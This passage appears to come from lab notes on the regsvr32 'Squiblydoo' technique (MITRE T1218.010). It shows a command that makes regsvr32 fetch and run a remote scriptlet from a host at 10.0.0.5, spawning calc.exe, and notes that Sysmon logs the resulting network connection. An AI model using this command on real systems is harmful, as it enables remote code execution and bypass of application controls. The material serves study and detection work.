
Invoke our file.svt by hosting it on a server
```
regsvr32.exe /s /i:http://10.0.0.5/file.sct scrobj.dll
```
calc.exe is spawned by regsvr32.exe:

![image](https://github.com/user-attachments/assets/2d8bab8b-8a61-4b73-92a0-f7e06e90fe7a)

However, sysmon will show regsvr32 establishing a network connection:

![image](https://github.com/user-attachments/assets/7a0a4e63-47a9-4a3a-8987-1e449171381e)

# References
- https://attack.mitre.org/techniques/T1218/010/
